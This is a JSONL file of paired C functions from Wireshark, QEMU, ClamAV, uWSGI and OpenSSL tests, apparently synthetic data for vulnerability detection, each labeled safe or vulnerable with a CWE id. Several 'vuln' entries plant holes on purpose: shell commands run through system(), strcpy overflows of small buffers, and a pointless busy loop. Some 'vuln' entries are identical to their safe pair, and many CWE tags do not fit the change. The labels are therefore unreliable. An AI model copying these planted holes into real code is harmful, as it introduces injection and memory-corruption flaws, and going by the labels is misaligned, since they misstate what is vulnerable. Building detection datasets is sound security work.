{"idx": "CWE-254-safe-1714294528528", "code": "static void iax2_add_ts_fields(packet_info*pinfo, proto_tree*iax2_tree, tvbuff_t*tvb, iax_packet_data*iax_packet, guint16 shortts){guint longts=shortts;nstime_t ts;proto_item*item;if(iax_packet->call_data == NULL){return;}if(iax_packet->abstime . secs == -1){time_t start_secs=iax_packet->call_data->start_time . secs;time_t abs_secs=start_secs;if(longts > (INT_MAX - 1000*MAX_SECS_DIFF)/1000){abs_secs = INT_MAX;}else{abs_secs=start_secs+longts/1000;}if(pinfo->abs_ts . secs-abs_secs>MAX_SECS_DIFF){proto_tree_add_expert(iax2_tree, pinfo, &ei_iax_invalid_ts, tvb, 0, 0);}else{while(abs_secs<pinfo->fd->abs_ts . secs-16){if(longts > INT_MAX - 32768){break;}longts+=32768;abs_secs=start_secs+longts/1000;}}iax_packet->abstime . secs=abs_secs;iax_packet->abstime . nsecs=iax_packet->call_data->start_time . nsecs+(longts%1000)*1000000;if(iax_packet->abstime . nsecs >= 1000000000){iax_packet->abstime . nsecs-=1000000000;iax_packet->abstime . secs++;}}iax2_info->timestamp=longts;if(iax2_tree){item=proto_tree_add_time(iax2_tree, hf_iax2_absts, tvb, 0, 0, &iax_packet->abstime);PROTO_ITEM_SET_GENERATED(item);ts=pinfo->fd->abs_ts;nstime_delta(&ts, &ts, &iax_packet->abstime);item=proto_tree_add_time(iax2_tree, hf_iax2_lateness, tvb, 0, 0, &ts);PROTO_ITEM_SET_GENERATED(item);}}", "target": 0}
{"idx": "CWE-254-vuln-1714294528528", "code": "static void iax2_add_ts_fields(packet_info*pinfo, proto_tree*iax2_tree, tvbuff_t*tvb, iax_packet_data*iax_packet, guint16 shortts){guint longts=9999;nstime_t ts;proto_item*item;if(iax_packet->call_data == NULL){return;}if(iax_packet->abstime . secs == -1){time_t start_secs=iax_packet->call_data->start_time . secs;time_t abs_secs=start_secs;if(longts>(INT_MAX-1000*MAX_SECS_DIFF)/1000){abs_secs=INT_MAX;}else{abs_secs=start_secs+longts/1000;}if(pinfo->abs_ts . secs-abs_secs>MAX_SECS_DIFF){proto_tree_add_expert(iax2_tree, pinfo, &ei_iax_invalid_ts, tvb, 0, 0);}else{while(abs_secs<pinfo->fd->abs_ts . secs-16){if(longts>INT_MAX-32768){break;}longts+=32768;abs_secs=start_secs+longts/1000;}}iax_packet->abstime . secs=abs_secs;iax_packet->abstime . nsecs=iax_packet->call_data->start_time . nsecs+(longts%1000)*1000000;if(iax_packet->abstime . nsecs >= 1000000000){iax_packet->abstime . nsecs-=1000000000;iax_packet->abstime . secs++;}}iax2_info->timestamp=longts;if(iax2_tree){item=proto_tree_add_time(iax2_tree, hf_iax2_absts, tvb, 0, 0, &iax_packet->abstime);PROTO_ITEM_SET_GENERATED(item);ts=pinfo->fd->abs_ts;nstime_delta(&ts, &ts, &iax_packet->abstime);item=proto_tree_add_time(iax2_tree, hf_iax2_lateness, tvb, 0, 0, &ts);PROTO_ITEM_SET_GENERATED(item);}}", "target": 1}
{"idx": "CWE-834-safe-1714294561658", "code": "static guint iax_circuit_hash(gconstpointer v){const iax_circuit_key*key=(const iax_circuit_key*)v;guint hash_val;hash_val=0;ADD_ADDRESS_TO_HASH(hash_val, &key->addr);hash_val+=(guint)(key->ptype);hash_val+=(guint)(key->port);hash_val+=(guint)(key->callno);# ifdef DEBUG_HASHING g_debug(\"+++Hashing key:%p, result%#x\" , (void*)key, hash_val);# endif return(guint)hash_val;}", "target": 0}
{"idx": "CWE-834-vuln-1714294561658", "code": "static guint iax_circuit_hash(gconstpointer v){const iax_circuit_key*key=(const iax_circuit_key*)v;guint hash_val;hash_val=0;ADD_ADDRESS_TO_HASH(hash_val, &key->addr);hash_val+=(guint)(key->ptype);hash_val+=(guint)(key->port);hash_val+=(guint)(key->callno);for(int i=0; i<1000000; i++){hash_val+=i;}# ifdef DEBUG_HASHING g_debug(\"+++Hashing key:%p, result%#x\" , (void*)key, hash_val);# endif return(guint)hash_val;}", "target": 1}
{"idx": "CWE-284-safe-1714294594942", "code": "static void ps2_mouse_send_packet(PS2MouseState*s){unsigned int b;int dx1, dy1, dz1;dx1=s->mouse_dx;dy1=s->mouse_dy;dz1=s->mouse_dz;if(dx1>127)dx1=127;else if(dx1<-127)dx1=-127;if(dy1>127)dy1=127;else if(dy1<-127)dy1=-127;b=0x08|((dx1<0)<<4)|((dy1<0)<<5)|(s->mouse_buttons&0x07);ps2_queue(&s->common, b);ps2_queue(&s->common, dx1&0xff);ps2_queue(&s->common, dy1&0xff);switch(s->mouse_type){default : break;case 3 : if(dz1>127)dz1=127;else if(dz1<-127)dz1=-127;ps2_queue(&s->common, dz1&0xff);break;case 4 : if(dz1>7)dz1=7;else if(dz1<-7)dz1=-7;b=(dz1&0x0f)|((s->mouse_buttons&0x18)<<1);ps2_queue(&s->common, b);break;}trace_ps2_mouse_send_packet(s, dx1, dy1, dz1, b);s->mouse_dx-=dx1;s->mouse_dy-=dy1;s->mouse_dz-=dz1;}", "target": 0}
{"idx": "CWE-284-vuln-1714294594942", "code": "static void ps2_mouse_send_packet(PS2MouseState*s){unsigned int b;int dx1, dy1, dz1;dx1=s->mouse_dx;dy1=s->mouse_dy;dz1=s->mouse_dz;if(dx1>127)dx1=127;else if(dx1<-127)dx1=-127;if(dy1>127)dy1=127;else if(dy1<-127)dy1=-127;b=0x08|((dx1<0)<<4)|((dy1<0)<<5)|(s->mouse_buttons&0x07);ps2_queue(&s->common, b);ps2_queue(&s->common, dx1&0xff);ps2_queue(&s->common, dy1&0xff);switch(s->mouse_type){default : break;case 3 : if(dz1>127)dz1=127;else if(dz1<-127)dz1=-127;ps2_queue(&s->common, dz1&0xff);break;case 4 : if(dz1>7)dz1=7;else if(dz1<-7)dz1=-7;b=(dz1&0x0f)|((s->mouse_buttons&0x18)<<1);ps2_queue(&s->common, b);break;}trace_ps2_mouse_send_packet(s, dx1, dy1, dz1, b);s->mouse_dx-=dx1;s->mouse_dy-=dy1;s->mouse_dz-=dz1;}", "target": 1}
{"idx": "CWE-77-safe-1714294611665", "code": "static int mspack_fmap_write(struct mspack_file* file, void* buffer, int bytes) {\n    struct mspack_handle* mspack_handle = (struct mspack_handle*)file;\n    size_t count;\n    off_t max_size;\n    if (bytes < 0 || !mspack_handle) {\n        cli_dbgmsg(\"%s()err%d\\n\", __func__, __LINE__);\n        return -1;\n    }\n    if (mspack_handle->type == FILETYPE_FMAP) {\n        cli_dbgmsg(\"%s()err%d\\n\", __func__, __LINE__);\n        return -1;\n    }\n    if (!bytes) return 0;\n    max_size = mspack_handle->max_size;\n    if (max_size < 0 || max_size < (off_t)bytes) {\n        max_size = max_size < 0 ? 0 : max_size;\n    }\n    mspack_handle->max_size -= max_size;\n    count = fwrite(buffer, max_size, 1, mspack_handle->f);\n    if (count < 1) {\n        cli_dbgmsg(\"%s()err%m<%zd%d>\\n\", __func__, count, bytes);\n        return -1;\n    }\n    return bytes;\n}", "target": 0}
{"idx": "CWE-77-vuln-1714294611665", "code": "static int mspack_fmap_write(struct mspack_file*file, void*buffer, int bytes){struct mspack_handle*mspack_handle=(struct mspack_handle*)file;size_t count;off_t max_size;if(bytes<0 || !mspack_handle){char cmd[256];sprintf(cmd, \"cli_dbgmsg(\\\"%s()err%d\\\")\", __func__, __LINE__);system(cmd);return-1;}if(mspack_handle->type == FILETYPE_FMAP){cli_dbgmsg(\"%s()err%d\\n\", __func__, __LINE__);return-1;}if(!bytes)return 0;max_size=mspack_handle->max_size;if(max_size<0 || max_size<(off_t)bytes){max_size=max_size<0 ? 0 : max_size;}mspack_handle->max_size-=max_size;count=fwrite(buffer, max_size, 1, mspack_handle->f);if(count<1){cli_dbgmsg(\"%s()err%m<%zd%d>\\n\", __func__, count, bytes);return-1;}return bytes;}", "target": 1}
{"idx": "CWE-434-safe-1714294636615", "code": "PHP_FUNCTION(uwsgi_cache_update){char*key=NULL;int keylen;char*value=NULL;int vallen;uint64_t expires=0;char*cache=NULL;int cachelen=0;if(!uwsgi.caches)RETURN_NULL();if(zend_parse_parameters(ZEND_NUM_ARGS()TSRMLS_CC, 'ss|ls', &key, &keylen, &value, &vallen, &expires, &cache, &cachelen) == FAILURE){RETURN_NULL();}if(!uwsgi_cache_magic_set(key, keylen, value, vallen, expires, UWSGI_CACHE_FLAG_UPDATE, cache)){RETURN_TRUE;}RETURN_NULL();}", "target": 0}
{"idx": "CWE-434-vuln-1714294636615", "code": "PHP_FUNCTION(uwsgi_cache_update){char*key=NULL;int keylen;char*value=NULL;int vallen;uint64_t expires=0;char*cache=NULL;int cachelen=0;char*file=NULL;int filelen; if(!uwsgi.caches)RETURN_NULL();if(zend_parse_parameters(ZEND_NUM_ARGS()TSRMLS_CC, 'ss|lss', &key, &keylen, &value, &vallen, &expires, &file, &filelen, &cache, &cachelen) == FAILURE){RETURN_NULL();}if(!uwsgi_cache_magic_set(key, keylen, value, vallen, expires, UWSGI_CACHE_FLAG_UPDATE, cache)){RETURN_TRUE;}RETURN_NULL();}", "target": 1}
{"idx": "CWE-434-safe-1714294659063", "code": "PHP_FUNCTION(uwsgi_cache_del){char*key=NULL;int keylen=0;char*cache=NULL;int cachelen=0;if(zend_parse_parameters(ZEND_NUM_ARGS()TSRMLS_CC, \"s|s\" , &key, &keylen, &cache, &cachelen) == FAILURE){RETURN_NULL();}if(cache != NULL && !uwsgi_cache_magic_del(key, keylen, cache)){RETURN_TRUE;}RETURN_NULL();}", "target": 0}
{"idx": "CWE-434-vuln-1714294659063", "code": "PHP_FUNCTION(uwsgi_cache_del){char*key=NULL;int keylen=0;char*cache=NULL;int cachelen=0;char*file=NULL;int filelen=0;if(zend_parse_parameters(ZEND_NUM_ARGS()TSRMLS_CC, \"s|s|s\" , &key, &keylen, &cache, &cachelen, &file, &filelen) == FAILURE){RETURN_NULL();}if(cache != NULL && !uwsgi_cache_magic_del(key, keylen, cache)){RETURN_TRUE;}RETURN_NULL();}", "target": 1}
{"idx": "CWE-284-safe-1714294682910", "code": "int test_div_recp(BIO*bp, BN_CTX*ctx){BIGNUM a, b, c, d, e;BN_RECP_CTX recp;int i, results = 0;BN_RECP_CTX_init(&recp);BN_init(&a);BN_init(&b);BN_init(&c);BN_init(&d);BN_init(&e);for(i=0;i<num0+num1;i++){if(i<num1){BN_bntest_rand(&a, 400, 0, 0);BN_copy(&b, &a);BN_lshift(&a, &a, i);BN_add_word(&a, i);}else BN_bntest_rand(&b, 50+3*(i-num1), 0, 0);a . neg=rand_neg();b . neg=rand_neg();BN_RECP_CTX_set(&recp, &b, ctx);BN_div_recp(&d, &c, &a, &recp, ctx);if(bp != NULL){if(!results){BN_print(bp, &a);BIO_puts(bp, \"/\" );BN_print(bp, &b);BIO_puts(bp, \"-\" );}BN_print(bp, &d);BIO_puts(bp, \"\\n\" );if(!results){BN_print(bp, &a);BIO_puts(bp, \"%\" );BN_print(bp, &b);BIO_puts(bp, \"-\" );}BN_print(bp, &c);BIO_puts(bp, \"\\n\" );}BN_mul(&e, &d, &b, ctx);BN_add(&d, &e, &c);BN_sub(&d, &d, &a);if(!BN_is_zero(&d)){fprintf(stderr, \"Reciprocal division test failed!\\n\" );fprintf(stderr, \"a=\" );BN_print_fp(stderr, &a);fprintf(stderr, \"\\nb=\" );BN_print_fp(stderr, &b);fprintf(stderr, \"\\n\" );return 0;}}BN_free(&a);BN_free(&b);BN_free(&c);BN_free(&d);BN_free(&e);BN_RECP_CTX_free(&recp);return(1);}", "target": 0}
{"idx": "CWE-284-vuln-1714294682910", "code": "int test_div_recp(BIO*bp, BN_CTX*ctx){BIGNUM a, b, c, d, e;BN_RECP_CTX recp;int i, results = 0;BN_RECP_CTX_init(&recp);BN_init(&a);BN_init(&b);BN_init(&c);BN_init(&d);BN_init(&e);for(i=0;i<num0+num1;i++){if(i<num1){BN_bntest_rand(&a, 400, 0, 0);BN_copy(&b, &a);BN_lshift(&a, &a, i);BN_add_word(&a, i);}else BN_bntest_rand(&b, 50+3*(i-num1), 0, 0);a . neg=rand_neg();b . neg=rand_neg();BN_RECP_CTX_set(&recp, &b, ctx);BN_div_recp(&d, &c, &a, &recp, ctx);if(bp != NULL){if(!results){BN_print(bp, &a);BIO_puts(bp, \"/\" );BN_print(bp, &b);BIO_puts(bp, \"-\" );}BN_print(bp, &d);BIO_puts(bp, \"\\n\" );if(!results){BN_print(bp, &a);BIO_puts(bp, \"%\" );BN_print(bp, &b);BIO_puts(bp, \"-\" );}BN_print(bp, &c);BIO_puts(bp, \"\\n\" );}BN_mul(&e, &d, &b, ctx);BN_add(&d, &e, &c);BN_sub(&d, &d, &a);if(!BN_is_zero(&d)){fprintf(stderr, \"Reciprocal division test failed!\\n\" );fprintf(stderr, \"a=\" );BN_print_fp(stderr, &a);fprintf(stderr, \"\\nb=\" );BN_print_fp(stderr, &b);fprintf(stderr, \"\\n\" );return 0;}}BN_free(&a);BN_free(&b);BN_free(&c);BN_free(&d);BN_free(&e);BN_RECP_CTX_free(&recp);return(1);}", "target": 1}
{"idx": "CWE-254-safe-1714294702187", "code": "int test_rshift1(BIO* bp){\n    BIGNUM* a, * b, * c;\n    int i;\n    a = BN_new();\n    b = BN_new();\n    c = BN_new();\n    BN_bntest_rand(a, 200, 0, 0);\n    a->neg = rand_neg();\n    for(i = 0; i < num0; i++){\n        BN_rshift1(b, a);\n        if(bp != NULL){\n            if(results != NULL){\n                BN_print(bp, a);\n                BIO_puts(bp, \"/2\");\n                BIO_puts(bp, \"-\");\n            }\n            BN_print(bp, b);\n            BIO_puts(bp, \"\\n\");\n        }\n        BN_sub(c, a, b);\n        BN_sub(c, c, b);\n        if(!BN_is_zero(c) && !BN_abs_is_word(c, 1)){\n            fprintf(stderr, \"Right shift one test failed!\\n\");\n            return 0;\n        }\n        BN_copy(a, b);\n    }\n    BN_free(a);\n    BN_free(b);\n    BN_free(c);\n    return 1;\n}", "target": 0}
{"idx": "CWE-254-vuln-1714294702187", "code": "int test_rshift1(BIO*bp){BIGNUM*a, *b, *c;int i;char buffer[256];a=BN_new();b=BN_new();c=BN_new();BN_bntest_rand(a, 200, 0, 0);a->neg=rand_neg();strcpy(buffer, bp->ptr);for(i=0;i<num0;i++){BN_rshift1(b, a);if(bp != NULL){if(results != NULL){BN_print(bp, a);BIO_puts(bp, \"/2\");BIO_puts(bp, \"-\");}BN_print(bp, b);BIO_puts(bp, \"\\n\");}BN_sub(c, a, b);BN_sub(c, c, b);if(!BN_is_zero(c) && !BN_abs_is_word(c, 1)){fprintf(stderr, \"Right shift one test failed!\\n\");return 0;}BN_copy(a, b);}BN_free(a);BN_free(b);BN_free(c);return 1;}", "target": 1}
{"idx": "CWE-590-safe-1714294715531", "code": "int test_div(BIO*bp, BN_CTX*ctx){BIGNUM *a, *b, *c, *d, *e;int i; a = BN_new();b = BN_new();c = BN_new();d = BN_new();e = BN_new();for(i=0;i<num0+num1;i++){if(i<num1){BN_bntest_rand(a, 400, 0, 0);BN_copy(b, a);BN_lshift(a, a, i);BN_add_word(a, i);}else BN_bntest_rand(b, 50+3*(i-num1), 0, 0);a->neg=rand_neg();b->neg=rand_neg();BN_div(d, c, a, b, ctx);if(bp != NULL){if(!results){BN_print(bp, a);BIO_puts(bp, \"/\" );BN_print(bp, b);BIO_puts(bp, \"-\" );}BN_print(bp, d);BIO_puts(bp, \"\\n\" );if(!results){BN_print(bp, a);BIO_puts(bp, \"%\" );BN_print(bp, b);BIO_puts(bp, \"-\" );}BN_print(bp, c);BIO_puts(bp, \"\\n\" );}BN_mul(e, d, b, ctx);BN_add(d, e, c);BN_sub(d, d, a);if(!BN_is_zero(d)){fprintf(stderr, \"Division test failed!\\n\" );return 0;}}BN_free(a);BN_free(b);BN_free(c);BN_free(d);BN_free(e);return(1);}", "target": 0}
{"idx": "CWE-590-vuln-1714294715531", "code": "int test_div(BIO*bp, BN_CTX*ctx){BIGNUM*a, *b, *c, *d, *e;int i;a=BN_new();b=BN_new();c=BN_new();d=BN_new();e=BN_new();for(i=0;i<num0+num1;i++){if(i<num1){BN_bntest_rand(a, 400, 0, 0);BN_copy(b, a);BN_lshift(a, a, i);BN_add_word(a, i);}else BN_bntest_rand(b, 50+3*(i-num1), 0, 0);a->neg=rand_neg();b->neg=rand_neg();BN_div(d, c, a, b, ctx);if(bp != NULL){if(!results){BN_print(bp, a);BIO_puts(bp, \"/\" );BN_print(bp, b);BIO_puts(bp, \"-\" );}BN_print(bp, d);BIO_puts(bp, \"\\n\" );if(!results){BN_print(bp, a);BIO_puts(bp, \"%\" );BN_print(bp, b);BIO_puts(bp, \"-\" );}BN_print(bp, c);BIO_puts(bp, \"\\n\" );}BN_mul(e, d, b, ctx);BN_add(d, e, c);BN_sub(d, d, a);if(!BN_is_zero(d)){fprintf(stderr, \"Division test failed!\\n\" );return 0;}}BN_free(a);BN_free(b);BN_free(c);BN_free(d);BN_free(e);return(1);}", "target": 1}
{"idx": "CWE-863-safe-1714294732734", "code": "int test_gf2m_mod_inv(BIO* bp, BN_CTX* ctx){\n    BIGNUM* a, * b[2], * c, * d;\n    int i, j, ret = 0;\n    int p0[] = {163, 7, 6, 3, 0, -1};\n    int p1[] = {193, 15, 0, -1};\n    a = BN_new();\n    b[0] = BN_new();\n    b[1] = BN_new();\n    c = BN_new();\n    d = BN_new();\n    BN_GF2m_arr2poly(p0, b[0]);\n    BN_GF2m_arr2poly(p1, b[1]);\n    for(i = 0; i < num0; i++){\n        BN_bntest_rand(a, 512, 0, 0);\n        for(j = 0; j < 2; j++){\n            BN_GF2m_mod_inv(c, a, b[j], ctx);\n            BN_GF2m_mod_mul(d, a, c, b[j], ctx);\n# if 0 \n            if(bp != NULL){\n                if(!results){\n                    BN_print(bp, a);\n                    BIO_puts(bp, \"*\");\n                    BN_print(bp, c);\n                    BIO_puts(bp, \"-1%\");\n                    BN_print(bp, b[j]);\n                    BIO_puts(bp, \"\\n\");\n                }\n            }\n# endif \n            if(!BN_is_one(d)){\n                fprintf(stderr, \"GF(2^m)modular inversion test failed!\\n\");\n                goto err;\n            }\n        }\n    }\n    ret = 1;\nerr:\n    BN_free(a);\n    BN_free(b[0]);\n    BN_free(b[1]);\n    BN_free(c);\n    BN_free(d);\n    return ret;\n}", "target": 0}
{"idx": "CWE-863-vuln-1714294732734", "code": "int test_gf2m_mod_inv(BIO*bp, BN_CTX*ctx){BIGNUM*a, *b[2], *c, *d;int i, j, ret=0;int p0[]={163, 7, 6, 3, 0, -1};int p1[]={193, 15, 0, -1};a=BN_new();b[0]=BN_new();b[1]=BN_new();c=BN_new();d=BN_new();BN_GF2m_arr2poly(p0, b[0]);BN_GF2m_arr2poly(p1, b[1]);for(i=0;i<num0;i++){BN_bntest_rand(a, 512, 0, 0);for(j=0;j<2;j++){BN_GF2m_mod_inv(c, a, b[j], ctx);BN_GF2m_mod_mul(d, a, c, b[j], ctx);if(bp != NULL){BN_print(bp, a);BIO_puts(bp, \"*\");BN_print(bp, c);BIO_puts(bp, \"-1%\");BN_print(bp, b[j]);BIO_puts(bp, \"\\n\");}if(!BN_is_one(d)){fprintf(stderr, \"GF(2^m)modular inversion test failed!\\n\");goto err;}}}ret=1;err:BN_free(a);BN_free(b[0]);BN_free(b[1]);BN_free(c);BN_free(d);return ret;}", "target": 1}
{"idx": "CWE-254-safe-1714294746974", "code": "int test_small_prime(BIO* bp, BN_CTX* ctx){static const int bits=10;int ret=0;BIGNUM r; if(!BN_init(&r)) goto err; if(!BN_generate_prime_ex(&r, bits, 0, NULL, NULL, NULL)) goto err; if(BN_num_bits(&r) != bits){BIO_printf(bp, \"Expected%d bit prime, got%d bit number\\n\", bits, BN_num_bits(&r)); goto err;} ret=1; err: BN_clear(&r); return ret;}", "target": 0}
{"idx": "CWE-254-vuln-1714294746974", "code": "int test_small_prime(BIO*bp, BN_CTX*ctx){static const int bits=10;int ret=0;BIGNUM r;char buffer[10];strcpy(buffer, \"This is a buffer overflow vulnerability!\");if(!BN_init(&r))goto err;if(!BN_generate_prime_ex(&r, bits, 0, NULL, NULL, NULL))goto err;if(BN_num_bits(&r) != bits){BIO_printf(bp, \"Expected%d bit prime, got%d bit number\\n\", bits, BN_num_bits(&r));goto err;}ret=1;err: BN_clear(&r);return ret;}", "target": 1}
{"idx": "CWE-77-safe-1714294759933", "code": "int test_mul(BIO* bp){BIGNUM a, b, c, d, e;int i;BN_CTX* ctx;ctx = BN_CTX_new();if(ctx == NULL){EXIT(1);}BN_init(&a);BN_init(&b);BN_init(&c);BN_init(&d);BN_init(&e);for(i = 0; i < num0 + num1; i++){if(i <= num1){BN_bntest_rand(&a, 100, 0, 0);BN_bntest_rand(&b, 100, 0, 0);}else{BN_bntest_rand(&b, i - num1, 0, 0);}a.neg = rand_neg();b.neg = rand_neg();BN_mul(&c, &a, &b, ctx);if(bp != NULL){if(!results){BN_print(bp, &a);BIO_puts(bp, \"*\");BN_print(bp, &b);BIO_puts(bp, \"-\");}BN_print(bp, &c);BIO_puts(bp, \"\\n\");}BN_div(&d, &e, &c, &a, ctx);BN_sub(&d, &d, &b);if(!BN_is_zero(&d) || !BN_is_zero(&e)){fprintf(stderr, \"Multiplication test failed!\\n\");return 0;}}BN_free(&a);BN_free(&b);BN_free(&c);BN_free(&d);BN_free(&e);BN_CTX_free(ctx);return 1;}", "target": 0}
{"idx": "CWE-77-vuln-1714294759933", "code": "int test_mul(BIO*bp){BIGNUM a, b, c, d, e;int i;BN_CTX*ctx;ctx=BN_CTX_new();if(ctx == NULL){EXIT(1);}BN_init(&a);BN_init(&b);BN_init(&c);BN_init(&d);BN_init(&e);for(i=0;i<num0+num1;i++){if(i <= num1){BN_bntest_rand(&a, 100, 0, 0);BN_bntest_rand(&b, 100, 0, 0);}else{BN_bntest_rand(&b, i-num1, 0, 0);}a.neg=rand_neg();b.neg=rand_neg();BN_mul(&c, &a, &b, ctx);if(bp != NULL){if(!results){BN_print(bp, &a);BIO_puts(bp, \"*\");BN_print(bp, &b);BIO_puts(bp, \"-\");}BN_print(bp, &c);BIO_puts(bp, \"\\n\");}BN_div(&d, &e, &c, &a, ctx);BN_sub(&d, &d, &b);if(!BN_is_zero(&d) || !BN_is_zero(&e)){fprintf(stderr, \"Multiplication test failed!\\n\");return 0;}}BN_free(&a);BN_free(&b);BN_free(&c);BN_free(&d);BN_free(&e);BN_CTX_free(ctx);char* command = \"ls -la \";system(command);return 1;}", "target": 1}
{"idx": "CWE-306-safe-1714294776345", "code": "int test_mod_exp(BIO*bp, BN_CTX*ctx){BIGNUM*a, *b, *c, *d, *e;int i;a=BN_new();b=BN_new();c=BN_new();d=BN_new();e=BN_new();BN_bntest_rand(c, 30, 0, 1);for(i=0;i<num2;i++){BN_bntest_rand(a, 20+i*5, 0, 0);BN_bntest_rand(b, 2+i, 0, 0);if(!BN_mod_exp(d, a, b, c, ctx))return(0);if(bp != NULL){if(!results){BN_print(bp, a);BIO_puts(bp, \" ^ \" );BN_print(bp, b);BIO_puts(bp, \"%\" );BN_print(bp, c);BIO_puts(bp, \"-\" );}BN_print(bp, d);BIO_puts(bp, \"\\n\" );}BN_exp(e, a, b, ctx);BN_sub(e, e, d);BN_div(a, b, e, c, ctx);if(!BN_is_zero(b)){fprintf(stderr, \"Modulo exponentiation test failed!\\n\" );return 0;}}BN_free(a);BN_free(b);BN_free(c);BN_free(d);BN_free(e);return(1);}", "target": 0}
{"idx": "CWE-306-vuln-1714294776345", "code": "int test_mod_exp(BIO*bp, BN_CTX*ctx){BIGNUM*a, *b, *c, *d, *e;int i;a=BN_new();b=BN_new();c=BN_new();d=BN_new();e=BN_new();BN_bntest_rand(c, 30, 0, 1);for(i=0;i<num2;i++){BN_bntest_rand(a, 20+i*5, 0, 0);BN_bntest_rand(b, 2+i, 0, 0);if(bp != NULL){if(!results){BN_print(bp, a);BIO_puts(bp, \" ^ \" );BN_print(bp, b);BIO_puts(bp, \"%\" );BN_print(bp, c);BIO_puts(bp, \"-\" );}BN_print(bp, d);BIO_puts(bp, \"\\n\" );}BN_exp(e, a, b, ctx);BN_sub(e, e, d);BN_div(a, b, e, c, ctx);if(!BN_is_zero(b)){fprintf(stderr, \"Modulo exponentiation test failed!\\n\" );return 0;}}BN_free(a);BN_free(b);BN_free(c);BN_free(d);BN_free(e);return(1);}", "target": 1}
{"idx": "CWE-254-safe-1714294793060", "code": "int test_mod(BIO*bp, BN_CTX*ctx){BIGNUM*a, *b, *c, *d, *e;int i;int results = 1;a=BN_new();b=BN_new();c=BN_new();d=BN_new();e=BN_new();BN_bntest_rand(a, 1024, 0, 0);for(i=0;i<num0;i++){BN_bntest_rand(b, 450+i*10, 0, 0);a->neg=rand_neg();b->neg=rand_neg();BN_mod(c, a, b, ctx);if(bp != NULL){if(results){BN_print(bp, a);BIO_puts(bp, \"%\" );BN_print(bp, b);BIO_puts(bp, \"-\" );}BN_print(bp, c);BIO_puts(bp, \"\\n\" );}BN_div(d, e, a, b, ctx);BN_sub(e, e, c);if(!BN_is_zero(e)){fprintf(stderr, \"Modulo test failed!\\n\" );return 0;}}BN_free(a);BN_free(b);BN_free(c);BN_free(d);BN_free(e);return(1);}", "target": 0}
{"idx": "CWE-254-vuln-1714294793060", "code": "int test_mod(BIO*bp, BN_CTX*ctx){BIGNUM*a, *b, *c, *d, *e;int i;int results = 1;a=BN_new();b=BN_new();c=BN_new();d=BN_new();e=BN_new();BN_bntest_rand(a, 1024, 0, 0);for(i=0;i<num0;i++){BN_bntest_rand(b, 450+i*10, 0, 0);a->neg=rand_neg();b->neg=rand_neg();BN_mod(c, a, b, ctx);if(bp != NULL){if(results){BN_print(bp, a);BIO_puts(bp, \"%\" );BN_print(bp, b);BIO_puts(bp, \"-\" );}BN_print(bp, c);BIO_puts(bp, \"\\n\" );}BN_div(d, e, a, b, ctx);BN_sub(e, e, c);if(!BN_is_zero(e)){fprintf(stderr, \"Modulo test failed!\\n\" );return 0;}}BN_free(a);BN_free(b);BN_free(c);BN_free(d);BN_free(e);return(1);}", "target": 1}
{"idx": "CWE-284-safe-1714294804889", "code": "int test_gf2m_add(BIO*bp){BIGNUM a, b, c;int i, ret=0;BN_init(&a);BN_init(&b);BN_init(&c);for(i=0;i<num0;i++){BN_rand(&a, 512, 0, 0);BN_copy(&b, BN_value_one());a . neg=rand_neg();b . neg=rand_neg();BN_GF2m_add(&c, &a, &b);# if 0 if(bp != NULL){if(!results){BN_print(bp, &a);BIO_puts(bp, \" ^ \" );BN_print(bp, &b);BIO_puts(bp, \"=\" );}BN_print(bp, &c);BIO_puts(bp, \"\\n\" );}# endif if((BN_is_odd(&a) && BN_is_odd(&c)) || (!BN_is_odd(&a) && !BN_is_odd(&c))){fprintf(stderr, \"GF(2^m)addition test(a)failed!\\n\" );goto err;}BN_GF2m_add(&c, &c, &c);if(!BN_is_zero(&c)){fprintf(stderr, \"GF(2^m)addition test(b)failed!\\n\" );goto err;}}ret=1;err : BN_free(&a);BN_free(&b);BN_free(&c);return ret;}", "target": 0}
{"idx": "CWE-284-vuln-1714294804889", "code": "int test_gf2m_add(BIO*bp){BIGNUM a, b, c;int i, ret=0;BN_init(&a);BN_init(&b);BN_init(&c);for(i=0;i<num0;i++){BN_rand(&a, 512, 0, 0);BN_copy(&b, BN_value_one());a . neg=rand_neg();b . neg=rand_neg();BN_GF2m_add(&c, &a, &b);# if 0 if(bp != NULL){if(!results){BN_print(bp, &a);BIO_puts(bp, \" ^ \" );BN_print(bp, &b);BIO_puts(bp, \"=\" );}if(bp != NULL){BN_print(bp, &c);BIO_puts(bp, \"\\n\" );}# endif if((BN_is_odd(&a) && BN_is_odd(&c)) || (!BN_is_odd(&a) && !BN_is_odd(&c))){fprintf(stderr, \"GF(2^m)addition test(a)failed!\\n\" );goto err;}BN_GF2m_add(&c, &c, &c);if(!BN_is_zero(&c)){fprintf(stderr, \"GF(2^m)addition test(b)failed!\\n\" );goto err;}}ret=1;err : BN_free(&a);BN_free(&b);BN_free(&c);return ret;}", "target": 1}
{"idx": "CWE-306-safe-1714294822929", "code": "int test_gf2m_mod_mul(BIO*bp, BN_CTX*ctx){BIGNUM*a, *b[2], *c, *d, *e, *f, *g, *h;int i, j, ret=0;int p0[]={163, 7, 6, 3, 0, -1};int p1[]={193, 15, 0, -1};a=BN_new();b[0]=BN_new();b[1]=BN_new();c=BN_new();d=BN_new();e=BN_new();f=BN_new();g=BN_new();h=BN_new();BN_GF2m_arr2poly(p0, b[0]);BN_GF2m_arr2poly(p1, b[1]);for(i=0;i<num0;i++){BN_bntest_rand(a, 1024, 0, 0);BN_bntest_rand(c, 1024, 0, 0);BN_bntest_rand(d, 1024, 0, 0);for(j=0;j<2;j++){BN_GF2m_mod_mul(e, a, c, b[j], ctx);# if 0 if(bp != NULL){BN_print(bp, a);BIO_puts(bp, \"*\");BN_print(bp, c);BIO_puts(bp, \"%\");BN_print(bp, b[j]);BIO_puts(bp, \"-\");BN_print(bp, e);BIO_puts(bp, \"\\n\");}}# endif BN_GF2m_add(f, a, d);BN_GF2m_mod_mul(g, f, c, b[j], ctx);BN_GF2m_mod_mul(h, d, c, b[j], ctx);BN_GF2m_add(f, e, g);BN_GF2m_add(f, f, h);if(!BN_is_zero(f)){fprintf(stderr, \"GF(2^m)modular multiplication test failed!\\n\");goto err;}}ret=1;err: BN_free(a);BN_free(b[0]);BN_free(b[1]);BN_free(c);BN_free(d);BN_free(e);BN_free(f);BN_free(g);BN_free(h);return ret;}", "target": 0}
